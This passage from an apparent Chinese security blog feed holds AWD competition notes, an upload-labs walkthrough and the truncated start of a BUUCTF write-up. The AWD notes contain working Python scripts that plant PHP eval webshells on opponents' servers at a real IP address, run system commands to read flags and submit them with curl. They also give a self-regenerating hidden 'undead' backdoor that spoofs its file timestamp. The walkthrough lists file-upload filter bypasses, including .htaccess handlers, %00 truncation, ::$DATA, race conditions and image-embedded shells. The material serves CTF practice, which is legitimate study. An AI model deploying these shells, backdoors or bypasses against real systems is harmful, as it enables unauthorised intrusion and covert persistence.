alt="image-20210620145946523"></p><p>在自己本机上运行，尝试着执行这些shell拿到flag，本地一分钟内起不了就算了，盲猜效果或者拿自己的靶机测试</p><p>不过这步其实没有必要，D盾能扫到的，大家一般都修复了，如果有新手或者菜鸟，到可以试试</p><p>当然说不定有人没修</p><p>并时刻注意靶机的运行状态，不要让网站崩掉，一但崩掉，立刻修复网站，防止掉分</p><h3 id="利用漏洞，批量化flag"><a href="#利用漏洞，批量化flag" class="headerlink" title="利用漏洞，批量化flag"></a>利用漏洞，批量化flag</h3><p>最简单的shell.php文件夹不做分析，学过的都懂，这里直接分析其他的</p><p><img src="image-20210620151059343.png" alt="image-20210620151059343"></p><p>拿log1.php举例分析</p><p>这里绝对式故意的，将get，post等请求的参数进行json编码，然后写进log.php文件</p><p>过分的是上面的log.txt居然注释了</p><p>以防万一，这里直接把 fwrite 注释掉</p><p>在本地上传成功，直接打</p><p><img src="image-20210620152632174.png" alt="image-20210620152632174"></p><p><img src="image-20210620152836205.png" alt="image-20210620152836205"></p><p><img src="image-20210620152922773.png" alt="image-20210620152922773"></p><p>这样就拿到了flag</p><p>flag每五分钟刷新一轮，所以我们无论找到几个利用点，只需要提一次flag即可</p><p>一般awd队伍常在30队以上，一个个提显然是不明智的，所以我们需要写批量化脚本</p><p>顺手提掉到手的flag，浪费可耻，开始写脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requests<span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    shell_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/include/log1.php"</span>    data_a <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"aa"</span><span class="token punctuation">:</span> <span class="token string">"&lt;?php @eval($_POST[atmujie]);?>"</span>    <span class="token punctuation">}</span>    res_shell <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> shell_url <span class="token punctuation">,</span>data<span class="token operator">=</span>data_a<span class="token punctuation">)</span>    shell_url_2 <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/log.php"</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"atmujie"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag');"</span>    <span class="token punctuation">}</span>    res_flag <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>shell_url_2<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">return</span> res_flag<span class="token keyword">for</span> ip <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> ip <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    url <span class="token operator">=</span> <span class="token string">"http://1.15.224.114:900{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    shell_flag <span class="token operator">=</span> shell<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"hctf{(.*?)}"</span><span class="token punctuation">,</span>shell_flag<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> <span class="token string">"hctf{"</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">"}"</span>    sy <span class="token operator">=</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'curl -X POST http://192.168.135.133:19999/api/flag -H "Authorization: 576d130d6ab595dc5a60e8f9b197a879" -d "{ \\"flag\\": \\"hctf{'</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">'}\\" }"'</span><span class="token punctuation">)</span>    sy <span class="token operator">=</span> str<span class="token punctuation">(</span>sy<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>真的扎心，一个批量化我写了二十多分钟,还写的贼拉跨，还是不够强</p><p>然后就可以每轮提一波了</p><h3 id="审计D盾未能扫到的漏洞"><a href="#审计D盾未能扫到的漏洞" class="headerlink" title="审计D盾未能扫到的漏洞"></a>审计D盾未能扫到的漏洞</h3><p>当利用完了很明显的后门，接下来就该审计代码，找找不那么明显的后门了</p><p>这里不做分析，根据情况审计即可</p><h2 id="后门利用"><a href="#后门利用" class="headerlink" title="后门利用"></a>后门利用</h2><p>找到可利用的后门后，一个个的跑一句话显然是不理智的，这样会很麻烦</p><p>不提耗时的问题，只说漏洞被对方修复或者网站出现问题就会功亏一溃</p><p>直接利用不是一个好主意，这时就要用到权限维持</p><h3 id="上传不死马"><a href="#上传不死马" class="headerlink" title="上传不死马"></a>上传不死马</h3><p>不死马是维持权限最简单好用的办法</p><p>原理：</p><p>​    通过已知的漏洞，写入一个自启动的php文件，该文件会将脚本写入opcode,达成根据设定好的时间自动运行的效果</p><p>不死马脚本：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'.atmujie.php'</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">'&lt;?php if(md5($_GET["password"])=="7ac0852c4c3cfff535d3c746a9064daf"){@eval($_POST[a]);} ?>'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//pass=pass</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'touch -m -d "2018-12-01 09:10:12" .atmujie.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span>    <span class="token comment" spellcheck="true">//password=atmujie</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功传入不死马后，我们可以通过不死马来提flag</p><p><img src="image-20210620195003656.png" alt="image-20210620195003656"></p><p>当然不死马的伪装的好不好，得看思路骚不骚</p><p>这里有个小误区</p><h4 id="批量上传"><a href="#批量上传" class="headerlink" title="批量上传"></a>批量上传</h4><p>同直接对漏洞的利用，一个一个的传不死马同样很麻烦，所以写批量脚本来解决这个问题</p><p>一键上传所有存在此漏洞的队伍</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> urlsafe_b64encode<span class="token keyword">import</span> re<span class="token keyword">from</span> sys <span class="token keyword">import</span> exec_prefix<span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote<span class="token punctuation">,</span>quote<span class="token keyword">import</span> os<span class="token comment" spellcheck="true">#读取一句话木马</span><span class="token keyword">def</span> <span class="token function">tip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>r<span class="token string">"E:\My_木马\awd不死马\mujie.php"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        mujie <span class="token operator">=</span> quote<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> mujie<span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>mujie<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"admin_ccmd"</span><span class="token punctuation">:</span> <span class="token string">"file_put_contents(\"/var/www/html/m1ujie.php\",urldecode(\"{}\"));"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>mujie<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># print(data)</span>    res_post <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"/include/shell.php"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"成功"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    mujie <span class="token operator">=</span> tip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> ip <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> ip <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        url <span class="token operator">=</span> <span class="token string">"http://1.15.224.114:900{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>mujie<span class="token punctuation">)</span>        url_shell <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/.atmujie.php?password=atmujie"</span>        data_shell <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"atmujie"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag.txt');"</span>        <span class="token punctuation">}</span>        res_shell <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url_shell<span class="token punctuation">,</span>data <span class="token operator">=</span> data_shell<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">print</span><span class="token punctuation">(</span>res_shell<span class="token punctuation">)</span>        flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"hctf{(.*?)}"</span><span class="token punctuation">,</span>res_shell<span class="token punctuation">)</span>        flag <span class="token operator">=</span> <span class="token string">"hctf{"</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">"}"</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只是个例子，写的太差了</p><p>然后配合批量提flag脚本提flag就行</p><p>基本的攻击部分到这里就结束了，接下来就是审计代码，找到那些隐藏较深的漏洞进行利用，这里就不分析了</p><p>接下来是防御部分</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>最基础的修复很简单，只需要将漏洞的关键语句删除即可</p><p>而更深的漏洞，需要一定的代码功底，这种漏洞一不留神就会导致网站Down掉</p><p>这里不对整个的堡垒机进行漏洞分析</p><h3 id="上传waf"><a href="#上传waf" class="headerlink" title="上传waf"></a>上传waf</h3><p>在不一定找的到功能漏洞的情况下，直接上传waf是个不错的选择</p><p><img src="image-20210621172557174.png" alt="image-20210621172557174"></p><p>一个好的waf可以有效的保护堡垒机</p><p>比如图中的waf就是学长制作的，可以检测并自动杀掉不死马，并且保护网站文件不被非法篡改</p><p>当然删库就没办法了</p><p><img src="image-20210621173435565.png" alt="image-20210621173435565"></p><p>还好，有备份</p><p><img src="image-20210621173812043.png" alt="image-20210621173812043"></p><p>waf就不贴了，尊重知识产权，顺便防止看到这里的各位不会拿我的waf打我</p><p>想要好的waf，就努力学，自己写</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>我这篇笔记真的水</p><p>这里只是很浅的分析了一波流程，并没有什么实质性的东西，就当是理清一下awd吧</p><p>具体的还是要根据实际情况实际操作</p><p>awd，考察的就是随机应变的能力和基本功</p>]]></content>
      
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs通关笔记</title>
      <link href="/2021/05/19/upload%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/05/19/upload%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-labs通关笔记"><a href="#upload-labs通关笔记" class="headerlink" title="upload-labs通关笔记"></a>upload-labs通关笔记</h1><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180712092548-81b98800-8572-1.png" alt="img"></p><h2 id="pass-1"><a href="#pass-1" class="headerlink" title="pass-1"></a>pass-1</h2><h3 id="mypayload-抓包绕过"><a href="#mypayload-抓包绕过" class="headerlink" title="mypayload,抓包绕过"></a>mypayload,抓包绕过</h3><blockquote><p>只在前端js文件中写了过滤</p><p>通过抓包绕过白名单</p><p>​    <img src="image-20210513152712152.png" alt="image-20210513152712152"></p><p>上传木马成功</p><p>使用蚁剑链接</p><p>​    <img src="image-20210513152933069.png" alt="image-20210513152933069"></p><p>post传参</p><p><img src="image-20210513163952467.png" alt="image-20210513163952467"></p><p>得到数据，成功</p><p>通关</p></blockquote><h3 id="wp，取消前端js文件验证"><a href="#wp，取消前端js文件验证" class="headerlink" title="wp，取消前端js文件验证"></a>wp，取消前端js文件验证</h3><blockquote><p>浏览器可以禁用js的方法，</p><p>在火狐浏览器里，访问url:<code>about:config</code></p><p>搜索<strong>javascript.enabled</strong></p><p>将true改成false</p><p>在谷歌浏览器中，只需打开设置，禁止使用JavaScript即可</p><p><img src="image-20210513160928950.png" alt="image-20210513160928950"></p><p>无论多么强大的js，都会在这里一键禁用</p></blockquote><h3 id="wp-前端手动写入允许php文件通过"><a href="#wp-前端手动写入允许php文件通过" class="headerlink" title="wp,前端手动写入允许php文件通过"></a>wp,前端手动写入允许php文件通过</h3><blockquote><p>前端的html,js内容可以在页面上进行更改，所以只需在浏览器页面前端添加php文件白名单即可</p></blockquote><h2 id="pass-2"><a href="#pass-2" class="headerlink" title="pass-2"></a>pass-2</h2><h3 id="mypayoad，抓包绕过"><a href="#mypayoad，抓包绕过" class="headerlink" title="mypayoad，抓包绕过"></a>mypayoad，抓包绕过</h3><blockquote><p>提示是：本pass在服务端对数据包的MIME进行检查！</p><p>和第一关一样，抓包就可以绕</p><p><a href="https://blog.csdn.net/B_roin/article/details/104819158?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">mime详解</a></p><p>简单来说，网站检测上传的mime信息</p><p><img src="https://img-blog.csdnimg.cn/20200315212124282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Jfcm9pbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>直接发送内含木马的jpg文件相当于除了内容都和jpg一致，Content-Type自然是jpg文件</p><p><img src="image-20210513155924161.png" alt="image-20210513155924161"></p></blockquote><h2 id="pass-3"><a href="#pass-3" class="headerlink" title="pass-3"></a>pass-3</h2><h3 id="mypayload-漏网之鱼-phtml"><a href="#mypayload-漏网之鱼-phtml" class="headerlink" title="mypayload,漏网之鱼.phtml"></a>mypayload,漏网之鱼.phtml</h3><blockquote><p>根据提示，pass3为黑名单过滤</p><p><img src="image-20210513180022279.png" alt="image-20210513180022279"></p><p>只过滤了四种文件后缀，存在漏网之鱼</p><p>.phtml</p><ul><li><p>php后缀</p><p>  php文件使用一般有三种情况</p><p>  1、单纯的使用php代码，后缀为.php</p><p>  2、单纯使用html，后缀为,html</p><p>  3、使用html并且嵌套php,后缀使用.php或者.phtml均可</p></li></ul><p>pass3没有对html文件和phtml文件进行过滤，所以可以上传这两种文件绕过黑名单</p><p><img src="image-20210513180701293.png" alt="image-20210513180701293"></p></blockquote><h3 id="wp-漏网之鱼-php3"><a href="#wp-漏网之鱼-php3" class="headerlink" title="wp,漏网之鱼.php3"></a>wp,漏网之鱼.php3</h3><blockquote><p>同上，.php3的文件也可以执行php</p></blockquote><h2 id="pass-4"><a href="#pass-4" class="headerlink" title="pass-4"></a>pass-4</h2><h3 id="mypayload-htaccess配置文件执行"><a href="#mypayload-htaccess配置文件执行" class="headerlink" title="mypayload,.htaccess配置文件执行"></a>mypayload,.htaccess配置文件执行</h3><blockquote><p>这关过滤的很死，基本不存在直接上传php文件的可能</p><p>htaccess文件是<a href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页<a href="https://baike.baidu.com/item/301%E9%87%8D%E5%AE%9A%E5%90%91">301重定向</a>、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>htaccess文件用于apache服务器</p><p>htaccess文件可以定义文件解析的方式，可以规定解析特定的文件格式，如定义将jpg文件中符合PHP规则的文件解析为php</p><p>为了方便起见，我设置所有文件中符合php规则的都会被执行</p><p>SetHandler   application/x-httpd-php</p><p>上传后再上传=一句话</p><p><img src="image-20210513203300081.png" alt="image-20210513203300081"></p></blockquote><h2 id="pass-5"><a href="#pass-5" class="headerlink" title="pass-5"></a>pass-5</h2><h3 id="mypayload，后缀字母大小写绕过"><a href="#mypayload，后缀字母大小写绕过" class="headerlink" title="mypayload，后缀字母大小写绕过"></a>mypayload，后缀字母大小写绕过</h3><blockquote><p>大意了大意了，之前顺手命名为shell.PhP,一下就传上去了</p><p>后缀名大小写即可</p><p><img src="image-20210513205849351.png" alt="image-20210513205849351"></p><p>看代码才知道，它把大小写过滤去掉了</p><p><img src="image-20210513205947144.png" alt="image-20210513205947144"></p><p><img src="image-20210513210025401.png" alt="image-20210513210025401"></p></blockquote><h2 id="pass-6"><a href="#pass-6" class="headerlink" title="pass-6"></a>pass-6</h2><h3 id="mypayload，后缀空格绕过"><a href="#mypayload，后缀空格绕过" class="headerlink" title="mypayload，后缀空格绕过"></a>mypayload，后缀空格绕过</h3><blockquote><p>这关没什么思路，看了源码发现没有首尾去空，所以抓包再后缀名后加空格</p><p>但上传文件后报错404，看了wp，发现我思路没错</p><p>后来在一个师傅的博客里找到了答案</p><p><img src="image-20210514172103326.png" alt="image-20210514172103326"></p><p><strong>基于windows。。。</strong></p><p><strong>换windows靶机，执行成功</strong></p><p><img src="image-20210514171714656.png" alt="image-20210514171714656"></p></blockquote><blockquote><p>win系统会把后缀后的空格自动消除，而网页上传的空格会解析为url编码，从而使黑名单无法匹配文件后缀名，产生绕过</p><p>上传成功后win系统自动消除后缀后的空格，使我们可以正常的使用文件中的代码</p></blockquote><h2 id="pass-7"><a href="#pass-7" class="headerlink" title="pass-7"></a>pass-7</h2><h3 id="mypayload，后缀加点绕过黑名单"><a href="#mypayload，后缀加点绕过黑名单" class="headerlink" title="mypayload，后缀加点绕过黑名单"></a>mypayload，后缀加点绕过黑名单</h3><blockquote><p>看源码，没有过滤后缀名后的点</p><p>抓包，shell.php.</p><p>上传</p><p>成功</p><p><img src="image-20210514173558631.png" alt="image-20210514173558631"></p></blockquote><blockquote><p>原理同pass-6，不过pass-7的原理为：win系统会自动消除后缀后的没有其他字符的点</p><p>例如：1.php……….   会变为1.php 按php文件解析</p><p>​            1.php………jpg 点不会消除，会当作jpg文件解析</p><p>这么做大概是为了防止未知后缀错误</p></blockquote><h2 id="pass-8"><a href="#pass-8" class="headerlink" title="pass-8"></a>pass-8</h2><h3 id="mypayload-后缀加-DATA绕过检测"><a href="#mypayload-后缀加-DATA绕过检测" class="headerlink" title="mypayload,后缀加::$DATA绕过检测"></a>mypayload,后缀加::$DATA绕过检测</h3><blockquote><p>在php+Windows的情况下：如果文件名+”::$DATA” 会把 “::$DATA”之后的数据当成文件流处理，不会检测后缀名且保持”::$DATA”之前的文件名</p><p>pass-8取消了对::$DATA的检测</p><p>只需抓包改后缀为php::$DATA即可，此方法同样基于windows，不适用linux</p></blockquote><h2 id="pass-9"><a href="#pass-9" class="headerlink" title="pass-9"></a>pass-9</h2><h3 id="mypayload，代码漏洞"><a href="#mypayload，代码漏洞" class="headerlink" title="mypayload，代码漏洞"></a>mypayload，代码漏洞</h3><blockquote><p>pass-9中第15行代码保存时连接的不是最后一行处理的数据，造成漏洞</p><p><img src="image-20210514202915072.png" alt="image-20210514202915072"></p><p>所以构造后缀：php. . [php(点，空格，点)]</p></blockquote><h2 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h2><h3 id="mypayload，后缀双写绕过"><a href="#mypayload，后缀双写绕过" class="headerlink" title="mypayload，后缀双写绕过"></a>mypayload，后缀双写绕过</h3><blockquote><p>提示：本pass会从文件名中<strong>去除</strong>.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess字符！</p><p>看到去除，我第一时间想到了双写绕过</p><p>shell.pphphp</p><p>去除中间php后刚好再次构成php</p><p><img src="image-20210514214309158.png" alt="image-20210514214309158"></p><p>成功</p></blockquote><h2 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h2><h3 id="wp-00截断，GET传参"><a href="#wp-00截断，GET传参" class="headerlink" title="wp,%00截断，GET传参"></a>wp,%00截断，GET传参</h3><blockquote><p>不会做，看了wp</p><p><strong>重点注意！！</strong></p><p><strong>需要两个条件：php版本小于5.3.4；php的magic_quotes_gpc为OFF状态</strong></p><p>我就是ON状态一直没做出来</p><p>上传，发现get有路径，使用%00截断</p><p><img src="image-20210515182822261.png" alt="image-20210515182822261"></p><p>这样就可以造成一个含有.php的路径</p><p><img src="image-20210515183055922.png" alt="image-20210515183055922"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$file_ext</span> 截取文件的后缀名进行检查<span class="token variable">$img_path</span> 设置路径时定义了保存的命名方式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>只要我们在$_GET处使用%00截断，就可以得到一个php后缀的文件</p><p>而白名单的检测仍是jpg文件</p><p><img src="image-20210515185040744.png" alt="image-20210515185040744"></p><p>相当于网站自己把jpg文件保存并重命名未php文件</p></blockquote><h2 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h2><h3 id="wp-00截断，POST传参"><a href="#wp-00截断，POST传参" class="headerlink" title="wp,%00截断，POST传参"></a>wp,%00截断，POST传参</h3><p><img src="image-20210515200249282.png" alt="image-20210515200249282"></p><blockquote><p><strong>这里我自己做一直没成功，看了wp才想起来，get传参会将特殊符号转化成url编码，并在传给变量时自动解码，post传参没有解码url一说</strong></p><p><strong>所以在截断时我们需要自己解码，解码后是个空值</strong></p><p>不要直接使用空格，空格是%20(应该没人这么憨)</p></blockquote><p><img src="image-20210515201425688.png" alt="image-20210515201425688"></p><h2 id="0x00-00截断原理"><a href="#0x00-00截断原理" class="headerlink" title="0x00/%00截断原理"></a>0x00/%00截断原理</h2><blockquote><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><p>php 00截断</p><p>php版本要小于5.3.4，5.3.4及以上已经修复该问题</p><p>magic_quotes_gpc需要为OFF状态</p><p>include和require一般在网站内部读取文件</p><p>file_get_contents一般用于打开一个url或一个文件</p><p>file_exists判断文件是否存在</p></blockquote><h2 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h2><h3 id="mypayload-amp-amp-wp-上传图片马"><a href="#mypayload-amp-amp-wp-上传图片马" class="headerlink" title="mypayload&amp;&amp;wp,上传图片马"></a>mypayload&amp;&amp;wp,上传图片马</h3><blockquote><p>上传图片马</p><p>制作方法：</p><p>准备一张任意的图片，一个一句话木马文件</p><p>打开cmd</p><p>输入：</p><pre class="line-numbers language-cmd"><code class="language-cmd">copy 1.jpg/b+shell.php myshell.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>图片马有制作失败的可能，这是由于图片本身的问题，为了尽可能的规避问题，除了可以将一句话文件改为无法显示的jpg外，可以寻炸能够制作木马的图片，图片内存越小，成功率越高</strong></p><p><strong>php文件首行最好添加一些无用字符，防止copy后出现未知错误</strong></p><p><img src="image-20210516100647057.png" alt="image-20210516100647057"></p></blockquote><h2 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h2><h3 id="mypayload-图片马利用，文件包含"><a href="#mypayload-图片马利用，文件包含" class="headerlink" title="mypayload,图片马利用，文件包含"></a>mypayload,图片马利用，文件包含</h3><blockquote><p><strong>直接包含上传的图片马即可，这里可以检测图片马有没有制作成功</strong></p><p><img src="image-20210516103341356.png" alt="image-20210516103341356"></p></blockquote><h2 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h2><blockquote><p>靶场炸了</p></blockquote><h2 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h2><blockquote><p>二次渲染绕过，奈何我绕了好半天都过不去，先放放</p></blockquote><h2 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h2><h3 id="mypayload-，条件竞争"><a href="#mypayload-，条件竞争" class="headerlink" title="mypayload ，条件竞争"></a>mypayload ，条件竞争</h3><blockquote><p><strong>条件竞争</strong></p><p><strong>审代码，本关是先保存到本地，然后检查，如果是白名单内文件就保存，不是就删除，可这其中有个删除的时间差</strong></p><p><strong>大量发包非白名单的文件，然后再服务器没有删除之前访问，就叫做条件竞争</strong></p></blockquote><blockquote><p>上传shell.php,burp抓包，发送爆破模块</p><p><img src="image-20210516155951818.png" alt="image-20210516155951818"></p><p>数值爆破一万次，爆破的同时访问</p><p><img src="image-20210516160042058.png" alt="image-20210516160042058"></p><p>成功</p></blockquote><h2 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h2><h3 id="wp-条件竞争"><a href="#wp-条件竞争" class="headerlink" title="wp,条件竞争"></a>wp,条件竞争</h3><blockquote><p>同pass-17为条件竞争，但本关的逻辑是先检查后缀，检查后保存，然后重命名</p><p>所以我们可以上传一个图片马，然后使用条件竞争让服务端来不及改名</p><p><img src="image-20210516215809838-1621173491144.png" alt="image-20210516215809838"></p><p>这时如果有文件包含漏洞，就可以执行命令</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF ———— one</title>
      <link href="/2021/05/19/BUUCTF__one/"/>
      <url>/2021/05/19/BUUCTF__one/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-：一"><a href="#BUUCTF-：一" class="headerlink" title="BUUCTF ：一"></a>BUUCTF ：一</h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><blockquote><p>这道题漏洞在于它在验证后处理了我们传入的内容，而不是经过验证处理后的内容，我们只需要想办法绕过验证即可</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span 